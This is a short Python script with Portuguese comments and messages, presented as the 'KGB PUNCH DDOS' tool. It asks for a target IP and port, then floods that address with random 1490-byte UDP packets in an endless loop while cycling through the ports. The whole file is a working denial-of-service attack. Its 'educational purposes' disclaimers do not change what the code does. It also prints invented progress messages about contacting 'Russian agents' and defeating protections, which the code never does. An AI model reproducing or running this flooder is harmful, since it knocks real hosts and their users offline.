import sys
import os
import time
import socket
import random
from datetime import datetime
import pyfiglet

# Força baixar o pyfiglet, se der merda, usa um print tosco
try:
    import pyfiglet

    HAS_FIGLET = True
except ImportError:
    HAS_FIGLET = False


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def main():
    # Cores ANSI
    GREEN = "\033[92m"
    RESET = "\033[0m"

    print(GREEN)

    now = datetime.now()


    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payload = random._urandom(1490)

    # Banner
    if HAS_FIGLET:
        result = pyfiglet.figlet_format("KBG PUNCH DDOS")
        print(result)
    else:
        print("####################")
        print("#  KGB PUNCH DDOS  #")
        print("####################")


    print("\nUse somente em ambiente controlado, DDOS é crime pela legislação Brasileira\n")


    target_ip = input("IP Alvo   : ")
    try:
        target_port = int(input("Porta de Início: "))
    except ValueError:
        print("Erro: use número inteiro.")
        return

    print("\nREQUISIÇÃO ENVIADA PARA NOSSA AGÊNCIA")
    print("________________ENTRANDO EM CONTATO COM NOSSOS AGENTES RUSSOS_____________________")
    time.sleep(2)
    print("_________________ESTABELECENDO CONEXÃO___________________________")
    time.sleep(2)
    print("_________PRIMEIRA PROTEÇÃO VENCIDA_______________")
    time.sleep(2)
    print("_________________CONEXÃO ESTABELECIDA____________________________")
    time.sleep(2)
    print("    ATAQUE INICIADO. NOTA: APENAS PARA FINS EDUCACIONAIS")
    time.sleep(1)

    sent_count = 0
    current_port = target_port

    try:
        while True:

            sock.sendto(payload, (target_ip, current_port))
            sent_count += 1

            print(f"Enviado {sent_count} pacotes para {target_ip} através da porta: {current_port}")

            current_port += 1
            if current_port > 65534:
                current_port = 1

    except KeyboardInterrupt:
        print(f"\n{RESET}processo interrompido")
    except Exception as e:
        print(f"\nERRO {e}")


if __name__ == "__main__":
    main()